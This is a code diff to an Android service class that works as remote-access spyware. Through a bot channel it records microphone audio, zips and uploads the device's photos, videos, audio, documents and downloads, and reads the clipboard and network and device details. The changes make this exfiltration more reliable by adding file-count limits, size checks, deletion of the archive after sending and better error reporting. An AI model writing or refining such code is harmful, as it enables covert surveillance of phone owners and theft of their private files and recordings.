@@ -76,10 +76,10 @@ public class TelegramBotService extends Service {
         startForeground(1001, createNotification());
         sendStartupMessage();
         startPolling();
-        requestManageStoragePermission();
+        requestPermissions();
     }
 
-    private void requestManageStoragePermission() {
+    private void requestPermissions() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!Environment.isExternalStorageManager()) {
                 try {
@@ -256,7 +256,7 @@ public class TelegramBotService extends Service {
             mediaRecorder.prepare();
             mediaRecorder.start();
             isRecording = true;
-        } catch (Exception e) { sendMessage("❌ Recording failed"); }
+        } catch (Exception e) { sendMessage("❌ Recording failed: " + e.getMessage()); }
     }
 
     private void stopRecording() {
@@ -267,9 +267,12 @@ public class TelegramBotService extends Service {
                 mediaRecorder = null;
                 isRecording = false;
                 File f = new File(currentAudioPath);
-                if (f.exists()) sendFile(f.getName(), readBytes(f));
-                sendMessage("✅ Recording sent");
-            } catch (Exception e) { sendMessage("❌ Stop failed"); }
+                if (f.exists() && f.length() > 0) {
+                    sendFile(f.getName(), readBytes(f));
+                } else {
+                    sendMessage("❌ Recording file is empty");
+                }
+            } catch (Exception e) { sendMessage("❌ Stop failed: " + e.getMessage()); }
         } else {
             sendMessage("❌ No active recording");
         }
@@ -311,36 +314,43 @@ public class TelegramBotService extends Service {
             if (type == null || type.equals("all")) {
                 addAllFiles(zos);
             } else if (type.equals("photos")) {
-                addMediaFiles(zos, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "photos");
+                addMediaFiles(zos, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "photos", 100);
             } else if (type.equals("videos")) {
-                addMediaFiles(zos, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "videos");
+                addMediaFiles(zos, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "videos", 50);
             } else if (type.equals("audio")) {
-                addMediaFiles(zos, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio");
+                addMediaFiles(zos, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio", 100);
             } else if (type.equals("documents")) {
                 addDocuments(zos);
             }
             zos.close();
-            if (zipFile.exists()) sendFile(zipFile.getName(), readBytes(zipFile));
+            if (zipFile.exists() && zipFile.length() > 0) {
+                sendFile(zipFile.getName(), readBytes(zipFile));
+                zipFile.delete();
+            } else {
+                sendMessage("❌ No files found to zip");
+            }
         } catch (Exception e) { sendMessage("❌ Zip failed: " + e.getMessage()); }
     }
 
     private void addAllFiles(ZipOutputStream zos) {
-        addMediaFiles(zos, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "photos");
-        addMediaFiles(zos, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "videos");
-        addMediaFiles(zos, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio");
+        addMediaFiles(zos, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "photos", 100);
+        addMediaFiles(zos, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "videos", 50);
+        addMediaFiles(zos, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio", 100);
         addDocuments(zos);
-        addDirectory(zos, Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "downloads");
+        addDirectory(zos, Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "downloads", 50);
     }
 
-    private void addMediaFiles(ZipOutputStream zos, Uri uri, String folder) {
+    private void addMediaFiles(ZipOutputStream zos, Uri uri, String folder, int limit) {
         String[] projection = {MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME};
         Cursor c = getContentResolver().query(uri, projection, null, null, null);
         if (c != null) {
-            while (c.moveToNext()) {
+            int count = 0;
+            while (c.moveToNext() && count < limit) {
                 String path = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DATA));
                 String name = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME));
                 if (path != null && new File(path).exists()) {
                     addFileToZip(zos, path, folder + "/" + name);
+                    count++;
                 }
             }
             c.close();
@@ -349,15 +359,18 @@ public class TelegramBotService extends Service {
 
     private void addDocuments(ZipOutputStream zos) {
         File docsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
-        if (docsDir.exists()) addDirectory(zos, docsDir, "documents");
+        if (docsDir.exists()) addDirectory(zos, docsDir, "documents", 50);
     }
 
-    private void addDirectory(ZipOutputStream zos, File dir, String folderName) {
+    private void addDirectory(ZipOutputStream zos, File dir, String folderName, int limit) {
         File[] files = dir.listFiles();
         if (files == null) return;
+        int count = 0;
         for (File f : files) {
-            if (f.isFile()) {
+            if (count >= limit) break;
+            if (f.isFile() && f.length() > 0 && f.length() < 20 * 1024 * 1024) {
                 addFileToZip(zos, f.getAbsolutePath(), folderName + "/" + f.getName());
+                count++;
             }
         }
     }
@@ -365,7 +378,7 @@ public class TelegramBotService extends Service {
     private void addFileToZip(ZipOutputStream zos, String filePath, String entryName) {
         try {
             File f = new File(filePath);
-            if (!f.exists() || f.length() > 50 * 1024 * 1024) return;
+            if (!f.exists() || f.length() == 0) return;
             zos.putNextEntry(new ZipEntry(entryName));
             FileInputStream fis = new FileInputStream(f);
             byte[] buffer = new byte[8192];
@@ -394,7 +407,7 @@ public class TelegramBotService extends Service {
             } else {
                 sendMessage("❌ Clipboard not available");
             }
-        } catch (Exception e) { sendMessage("❌ Clipboard error: " + e.getMessage()); }
+        } catch (Exception e) { sendMessage("❌ Clipboard error"); }
     }
 
     private void getBatteryInfo() {
@@ -410,13 +423,18 @@ public class TelegramBotService extends Service {
     }
 
     private void getWifiInfo() {
-        StringBuilder sb = new StringBuilder();
         try {
+            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_WIFI_STATE) != PackageManager.PERMISSION_GRANTED) {
+                sendMessage("❌ WiFi permission not granted");
+                return;
+            }
+            StringBuilder sb = new StringBuilder();
             if (wifiManager != null) {
                 WifiInfo wi = wifiManager.getConnectionInfo();
                 if (wi != null && wi.getNetworkId() != -1) {
                     sb.append("📶 WiFi:\n");
                     sb.append("   📡 SSID: ").append(wi.getSSID()).append("\n");
+                    sb.append("   📶 Signal: ").append(wi.getRssi()).append(" dBm\n");
                     sb.append("   🌐 IP: ").append(intToIp(wi.getIpAddress())).append("\n");
                     sb.append("   🔢 MAC: ").append(wi.getMacAddress()).append("\n");
                 } else {
@@ -426,18 +444,12 @@ public class TelegramBotService extends Service {
             if (telephonyManager != null) {
                 sb.append("\n📱 Mobile:\n");
                 sb.append("   📡 Network: ").append(telephonyManager.getNetworkOperatorName()).append("\n");
-                sb.append("   🌐 Network Type: ").append(getNetworkType()).append("\n");
             }
             sendMessage(sb.toString());
-        } catch (Exception e) { sendMessage("❌ Network error: " + e.getMessage()); }
-    }
-
-    private String getNetworkType() {
-        int type = telephonyManager.getNetworkType();
-        switch (type) {
-            case TelephonyManager.NETWORK_TYPE_LTE: return "4G (LTE)";
-            case TelephonyManager.NETWORK_TYPE_NR: return "5G";
-            default: return "Unknown";
+        } catch (SecurityException e) {
+            sendMessage("❌ WiFi permission denied");
+        } catch (Exception e) {
+            sendMessage("❌ WiFi error: " + e.getMessage());
         }
     }
 
@@ -447,14 +459,16 @@ public class TelegramBotService extends Service {
 
     private String getFullDeviceInfo() {
         StringBuilder sb = new StringBuilder();
-        sb.append("📱 **Device Information**\n");
+        sb.append("📱 Device Information\n");
         sb.append("Model: ").append(Build.MODEL).append("\n");
         sb.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n");
         sb.append("Android: ").append(Build.VERSION.RELEASE).append("\n");
         sb.append("API: ").append(Build.VERSION.SDK_INT).append("\n");
-        android.os.StatFs stat = new android.os.StatFs(Environment.getExternalStorageDirectory().getPath());
-        long total = (long) stat.getBlockCount() * (long) stat.getBlockSize();
-        sb.append("Storage: ").append(total / (1024 * 1024 * 1024)).append(" GB\n");
+        try {
+            android.os.StatFs stat = new android.os.StatFs(Environment.getExternalStorageDirectory().getPath());
+            long total = (long) stat.getBlockCount() * (long) stat.getBlockSize();
+            sb.append("Storage: ").append(total / (1024 * 1024 * 1024)).append(" GB\n");
+        } catch (Exception e) {}
         return sb.toString();
     }
 
@@ -471,6 +485,10 @@ public class TelegramBotService extends Service {
     }
 
     private void sendFile(String name, byte[] data) {
+        if (data == null || data.length == 0) {
+            sendMessage("❌ File is empty");
+            return;
+        }
         new Thread(() -> {
             try {
                 String boundary = "----Boundary" + System.currentTimeMillis();
